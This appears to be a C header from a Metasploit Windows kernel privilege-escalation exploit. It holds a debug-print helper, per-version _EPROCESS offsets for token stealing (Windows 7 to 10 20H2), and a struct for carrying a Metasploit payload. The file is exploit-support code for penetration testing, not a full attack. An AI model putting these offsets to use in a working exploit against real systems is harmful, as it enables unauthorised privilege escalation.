#pragma once

#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

#ifdef DEBUGTRACE
#define dprintf(...) real_dprintf(__VA_ARGS__)
#else
#define dprintf(...) do{}while(0);
#endif

/*!
 * @brief Output a debug string to the debug console.
 * @details The function emits debug strings via `OutputDebugStringA`, hence all messages can be viewed
 *          using Visual Studio's _Output_ window, _DebugView_ from _SysInternals_, or _Windbg_.
 */
static _inline void real_dprintf(char* format, ...)
{
	va_list args;
	char buffer[1024];
	size_t len;
	_snprintf_s(buffer, sizeof(buffer), sizeof(buffer) - 1, "[%04x] ", GetCurrentThreadId());
	len = strlen(buffer);
	va_start(args, format);
	vsnprintf_s(buffer + len, sizeof(buffer) - len, sizeof(buffer) - len - 3, format, args);
	strcat_s(buffer, sizeof(buffer), "\r\n");
	OutputDebugStringA(buffer);
	va_end(args);
}

typedef struct _EPROCESS_OFFSETS {
	WORD ActiveProcessLinks;
	WORD Token;
	WORD UniqueProcessId;
} EPROCESS_OFFSETS;
typedef EPROCESS_OFFSETS* PEPROCESS_OFFSETS;

#ifdef _WIN64
/* Windows 7 SP0 (6.1.7600) - https://www.vergiliusproject.com/kernels/x64/Windows%207%20%7C%202008R2/RTM/_EPROCESS */
const static EPROCESS_OFFSETS EprocessOffsetsWin7Sp0 = { 0x188, 0x208, 0x180 };
/* Windows 7 SP1 (6.1.7601) - https://www.vergiliusproject.com/kernels/x64/Windows%207%20%7C%202008R2/SP1/_EPROCESS */
const static EPROCESS_OFFSETS EprocessOffsetsWin7Sp1 = { 0x188, 0x208, 0x180 };
/* Windows 8.1 (6.3.9600) - https://www.vergiliusproject.com/kernels/x64/Windows%208.1%20%7C%202012R2/Update%201/_EPROCESS */
const static EPROCESS_OFFSETS EprocessOffsetsWin8p1 = { 0x2e8, 0x348, 0x2e0 };
/* Windows 10 v1607 (10.0.14393) - https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1607%20Redstone%201%20(Anniversary%20Update)/_EPROCESS */
const static EPROCESS_OFFSETS EprocessOffsetsWin10v1607 = { 0x2f0, 0x358, 0x2e8 };
/* Windows 10 v1703 (10.0.15063) - https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1703%20Redstone%202%20(Creators%20Update)/_EPROCESS */
const static EPROCESS_OFFSETS EprocessOffsetsWin10v1703 = { 0x2e8, 0x358, 0x2e0 };
/* Windows 10 v1709 (10.0.16299) - https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1709%20Redstone%203%20(Fall%20Creators%20Update)/_EPROCESS */
const static EPROCESS_OFFSETS EprocessOffsetsWin10v1709 = { 0x2e8, 0x358, 0x2e0 };
/* Windows 10 v1803 (10.0.17134) - https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1803%20Redstone%204%20(Spring%20Creators%20Update)/_EPROCESS */
const static EPROCESS_OFFSETS EprocessOffsetsWin10v1803 = { 0x2e8, 0x358, 0x2e0 };
/* Windows 10 v1809 (10.0.17763) - https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1809%20Redstone%205%20(October%20Update)/_EPROCESS */
const static EPROCESS_OFFSETS EprocessOffsetsWin10v1809 = { 0x2e8, 0x358, 0x2e0 };
/* Windows 10 v1903 (10.0.18362) - https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1903%2019H1%20(May%202019%20Update)/_EPROCESS */
const static EPROCESS_OFFSETS EprocessOffsetsWin10v1903 = { 0x2f0, 0x360, 0x2e8 };
/* Windows 10 v1909 (10.0.18362) - https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1909%2019H2%20(November%202019%20Update)/_EPROCESS */
const static EPROCESS_OFFSETS EprocessOffsetsWin10v1909 = { 0x2f0, 0x360, 0x2e8 };
/* Windows 10 v2004 / 20H1 (10.0.19041) - https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/2004%2020H1%20(May%202020%20Update)/_EPROCESS */
const static EPROCESS_OFFSETS EprocessOffsetsWin10v2004 = { 0x448, 0x4b8, 0x440 };
/* Windows 10 v2009 / 20H2 (10.0.19041) - https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/2009%2020H2%20(October%202020%20Update)/_EPROCESS */
const static EPROCESS_OFFSETS EprocessOffsetsWin10v2009 = { 0x448, 0x4b8, 0x440 };
#endif

/*
 * This struct makes the exploit compatible with a Metasploit payload of an arbitrary as constructed using something like:
 *
 * encoded_payload = payload.encoded
 * [encoded_payload.length].pack('I<') + encoded_payload
 */
typedef struct _MSF_PAYLOAD {
	DWORD  dwSize;
	CHAR  cPayloadData[];
} MSF_PAYLOAD;
typedef MSF_PAYLOAD* PMSF_PAYLOAD;
